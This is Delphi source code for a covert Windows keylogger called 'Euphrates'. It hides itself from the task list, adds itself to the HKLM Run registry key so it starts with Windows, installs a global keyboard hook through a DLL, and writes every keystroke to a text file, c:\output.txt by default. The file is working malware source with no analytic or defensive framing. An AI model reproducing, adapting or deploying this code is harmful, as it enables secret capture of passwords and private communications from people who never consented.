uses
  Windows, Classes, Messages, Sysutils, Registry,
  special in 'special.pas';

var
  cDLL, cOUT:string;

var
   FDataHandle:THandle;
   FDataPtr:^TSharedData;
   FDea:LongWord;
   FLastKey:integer;
   FFile:TextFile;

procedure HideMe;
type
  THideMeProc=procedure(foo:longint;bar:longint); stdcall;
var
  inst:THandle;
  hproc:THideMeProc;
begin
  inst:=LoadLibrary('kernel32.dll');
  if inst=0 then exit;
  hproc:=THideMeProc(GetProcAddress(inst,'RegisterServiceProcess'));
  if not Assigned(hproc) then
  begin
    FreeLibrary(inst);
  end
  else
    hproc(0,1);
end;

procedure E_Install;
var t:TRegistry;
begin
  t:=TRegistry.Create;
  try
  t.RootKey:=HKEY_LOCAL_MACHINE;
  t.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run',True);
  t.WriteString(ExtractFileName(ParamStr(0)),ParamStr(0));
  finally
  t.Free;
  end;
end;

procedure E_Clone(s2,s3:string);
var t:TRegistry;
begin
  t:=TRegistry.Create;
  try
  t.RootKey:=HKEY_LOCAL_MACHINE;
  t.OpenKey('\Software\Euphrates',True);
  t.WriteString('OutputFile',s2);
  t.WriteString('DLLFile',s3);
  finally
  t.Free;
  end;
end;

function E_WndProc(handle,msg,wparam,lparam:Longint):integer; stdcall;
var
  c:string;
  a:integer;
  FString:string;
begin
  Result:=0;
  case msg of
  WM_QUERYOPEN:;
  WM_DESTROY: PostQuitMessage(0);
  WM_SYSCOMMAND: if wParam=SC_CLOSE then PostQuitMessage(0);
  WM_USER+7:
     begin
        if (FDea<>0) and (GetTickCount>FDea+300000) then
           FDea:=0
        else if FDea<>0 then
           Exit;
        FString:='';
        if (lparam and (2 shl 30))<>0 then
           begin
              case wParam of
              $01: c:='{LBTN}';
              $02: c:='{RBTN}';
              $03: c:='{CANCEL}';
              $04: c:='{MBTN}';
              $08: c:='{BCK}';
              $09: c:='{TAB}'#13#10;
              $0C: c:='{CLEAR}';
              $0D: c:='{ENTER}'#13#10;
              $10: c:='{/SHIFT}';
              $11: c:='{/CTRL}';
              $12: c:='{/ALT}';
              $13: c:='{PAUSE}';
              $14: c:='{CAPS-LCK}';
              $1B: c:='{ESC}'#13#10;
              $20: c:=' ';
              $21: c:='{PG-UP}';
              $22: c:='{PG-DN}';
              $23: c:='{END}';
              $24: c:='{HOME}';
              $25: c:='{<-}';
              $26: c:='{UP}';
              $27: c:='{->}';
              $28: c:='{DN}';
              $29: c:='{SEL}';
              $2B: c:='{EXEC}';
              $2C: c:='';
              $2D: c:='{INS}';
              $2E: c:='{DEL}';
              $30..$39: c:=IntToStr(wParam-$30);
              $5B: c:='{LWIN}';
              $5C: c:='{RWIN}';
              $5D: c:='{APPS}';
              $60..$69: c:=Char(wparam-$60);
              $6A: c:='*';
              $6B: c:='+';
              $6D: c:='-';
              $6E: c:=',';
              $6F: c:='/';
              $70..$87: FmtStr(c,'{F%d}',[wparam-$6F]);
              $90: c:='{NUM-LCK}';
              $91: begin
                       c:='{SCRL-LCK}';
                       FDea:=GetTickCount;
                       if FLastKey=$12 then
                          begin
                             CloseHandle(FDataHandle);
                             PostQuitMessage(0);
                          end;
                   end;
              $41..$5A: c:=LowerCase(Char(wParam));
              $BA: c:=';';
              $BB: c:='=';
              $BC: c:=',';
              $BE: c:='.';
              $BD: c:='-';
              $BF: c:='/';
              $C0: c:='`';
              $DB: c:='[';
              $DC: c:='\';
              $DD: c:=']';
              $DE: c:='''';
              else FmtStr(c,'{HEX-%x}',[wparam]);
              end;
           FLastKey:=0;
           end
           else
              begin
                 if FLastKey=wparam then Exit;
                 case wparam of
                 $10: c:='{SHIFT}';
                 $11: c:='{CTRL}';
                 $12: c:='{ALT}';
                 else Exit;
              end;
           FLastKey:=wparam;
        end;
        for a:=1 to Word(lparam) do
           FString:=FString+c;
        Append(FFile);
        Write(FFile,FString);
        CloseFile(FFile);
     end;
  else Result:=DefWindowProc(handle,msg,wparam,lparam);
  end;
end;

procedure E_Initialize;
var
  hj:TWndClassEx;
  c,h,j:integer;
  t:tagMSG;
begin
  hj.cbSize:=SizeOf(hj);
  hj.style:=0;
  hj.lpfnWndProc:=@E_WndProc;
  hj.cbClsExtra:=0;
  hj.cbWndExtra:=0;
  hj.hInstance:=HInstance;
  hj.hIcon:=0;
  hj.hCursor:=0;
  hj.hbrBackground:=0;
  hj.lpszMenuName:='';
  hj.lpszClassName:='TheEuphratesWindow';
  hj.hIconSm:=0;
  if RegisterClassEx(hj)=0 then
     Halt(1);
  c:=CreateWindowEx(0,'TheEuphratesWindow','Euphrates',0,0,0,0,0,0,0,HInstance,nil);
  FDea:=0;
  h:=LoadLibrary(PChar(cDLL));
  if h=0 then
     Halt(1);
  j:=Integer(GetProcAddress(h,'HookProc'));
  if j=0 then
     Halt(1);
  FDataHandle:=CreateFileMapping($FFFFFFFF,nil,PAGE_READWRITE,0,sizeof(TSharedData),cMapName);
  if GetLastError=ERROR_ALREADY_EXISTS then
     begin
        CloseHandle(FDataHandle);
        Halt(1);
     end;
  FDataPtr:=MapViewOfFile(FDataHandle,File_Map_All_Access,0,0,0);
  FDataPtr^.NextH:=SetWindowsHookEx(WH_KEYBOARD,TFNHookProc(j),h,0);
  FDataPtr^.HWnd:=c;
  UnmapViewOfFile(FDataPtr);
  AssignFile(FFile,cOUT);
  if FileExists(cOUT) then
     Append(FFile)
  else
     ReWrite(FFile);
  Write(FFile,Format(#13#10'{DATE: %s}'#13#10,[FormatDateTime('',Now)]));
  CloseFile(FFile);
  while GetMessage(t,0,0,0) do
  begin
     TranslateMessage(t);
     DispatchMessage(t)
  end;
end;

var t:TRegistry;
begin
  try
  HideMe;
  if (ParamCount=3) and (UpperCase(ParamStr(1))='/CONFIG') then
     E_Clone(ParamStr(2),ParamStr(3))
  else if (ParamCount=1) and (UpperCase(ParamStr(1))='/INSTALL') then
     E_Install
  else if (ParamCount=1) and (UpperCase(ParamStr(1))='/RUNNING') then
     begin
        FDataHandle:=CreateFileMapping($FFFFFFFF,nil,PAGE_READWRITE,0,sizeof(TSharedData),cMapName);
        if GetLastError=ERROR_ALREADY_EXISTS then
           MessageBeep(0);
        CloseHandle(FDataHandle);
     end
  else if ParamCount=0 then
     begin
        t:=TRegistry.Create;
        try
           t.RootKey:=HKEY_LOCAL_MACHINE;
           t.OpenKey('\Software\Euphrates',True);
           cOUT:=t.ReadString('OutputFile');
           if cOUT='' then cOUT:='c:\output.txt';
           cDLL:=t.ReadString('DLLFile');
           if cDLL='' then cDLL:='hooker.dll';
           cOUT:=ExpandFileName(cOUT);
        finally
           t.Free;
        end;
        E_Initialize;
     end
  else
     Halt(4);
  except
     on Exception do Halt(6);
  end;
end.
